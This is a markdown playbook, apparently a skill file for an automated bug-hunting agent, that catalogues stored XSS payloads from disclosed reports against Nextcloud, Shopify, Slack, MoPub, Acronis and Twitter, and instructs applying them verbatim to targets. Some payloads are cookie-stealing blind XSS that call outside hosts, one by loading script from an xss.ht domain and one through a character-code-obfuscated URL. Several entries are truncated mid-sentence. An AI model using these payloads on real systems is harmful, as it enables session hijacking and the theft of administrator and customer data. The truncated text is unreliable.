---
name: hunter-l4-stored-xss
description: "Test and exploit stored XSS with real payloads and contexts from disclosed reports."
domain: cybersecurity
subdomain: web
tags:
- web
- stored-xss
- hunting
- l4
version: '1.0'
---
# L4 Playbook: Stored XSS (hunter)

**L3 technique sheet:** `knowledge/sheets/stored-xss.md` — (exists)

## When to use
Attack a target surface for Stored XSS. Load the L3 sheet for full sub-pattern detail; use the real exemplars below as concrete tests.

## Real validated patterns (from disclosed reports)

### 2058556 [ajaysenr]
- endpoint: `POST /apps/deck/cards/{num}/comments`
- parameter: `comment`
- payload: `<a href=http://██████/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="`
- root cause: Deck card comments accept and render unsanitized HTML (dangling markup with an injected <base target=>), executing attacker-controlled markup/script w
- impact: Confirmed one-time malicious script execution via HTML/comment injection in Deck cards (self-XSS) on Nextcloud 27.0.0.8; would enable cookie stealing 

### 964550 [ajaysenr]
- endpoint: `POST /accounts/{num} (avatar upload)`
- parameter: `account[avatar]`
- payload: `exiftool -Comment=""><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png`
- root cause: Avatar upload accepts a file served as Content-Type text/html (mime type tampered via Burp) whose PNG metadata comment carries a script that is then s
- impact: Uploaded a malicious avatar (PNG with XSS in its comment, Content-Type text/html) to accounts.shopify.com; the file was stored on shopify-assets.shopi

### 100565 [ajaysenr]
- endpoint: `Upload SVG to Slack channel/DM (rendered at slack-files.com)`
- parameter: `SVG file content`
- payload: `<svg width="100%" height="100%" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" onload="alert('script')">
  <script type="text/javascript"><![CDATA[
  // some exploit code here
  ]]></script>`
- root cause: Uploaded SVG files are served inline as image/svg+xml on slack-files.com without a restrictive Content-Security-Policy, so inline scripts and onload h
- impact: alert('script') executed on SVG load when a victim clicked the uploaded file on slack-files.com; attacker could render a fake sign-in form to trick us

### 100931 [ajaysenr]
- endpoint: `mopub.com link items (image click URL)`
- parameter: `click_url`
- payload: `javascript://%0a%0dalert(document.cookie)`
- root cause: The image click URL field allowed a javascript: scheme that executes on click.
- impact: XSS fired via alert(document.cookie); since admins invite many users to their inventory, those user sessions could be hijacked.

### 1010466 [ajaysenr]
- endpoint: `POST /upload_file`
- parameter: `filename`
- payload: `"><img src=1 onerror="url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,10`
- root cause: upload_file accepted an attacker-controlled filename without CSRF token/origin/referrer validation and stored it unescaped into the support chat.
- impact: Blind XSS executes in the support chat context; document.cookie is exfiltrated to the attacker's server; support staff affected even without clicking 

### 1011093 [ajaysenr]
- endpoint: `GET / (www.acronis.com)`
- payload: `N/A (XSS via improper error handling)`
- root cause: Improper error handling reflected/stored attacker input in a cacheable response.
- impact: XSS execution on www.acronis.com stored in a cacheable response.

### 1011888 [ajaysenr]
- endpoint: `POST /registration.html -> GET /phnx/driver.aspx?routename=Social/UniversalProfile/UserRecordEdit&TargetUser={num}`
- parameter: `company`
- payload: `"><script src=https://monty.xss.ht></script>`
- root cause: The registration Company field was not sanitized and the admin panel renders it without escaping.
- impact: Blind XSS fired in the admin panel, leaking admin session cookies (wm-*), the admin's IP, backend info, and other customers' names and email addresses

### 101450 [ajaysenr]
- endpoint: `POST /tweets (create tweet, message content)`
- parameter: `message`
- payload: `"><img src=x onerror=alert(document.domain)>`
- root cause: Tweet message content was rendered without sanitization, so the payload executed during compose and on publish.
- impact: XSS executes both when composing the tweet and when publishing it.

## Approach
1. Map endpoints that take identifiers/input (see L3 sheet for shapes).
2. Apply the verbatim payloads above; vary encoding/params.
3. Prove impact with a request+response+impact (evidence gate).

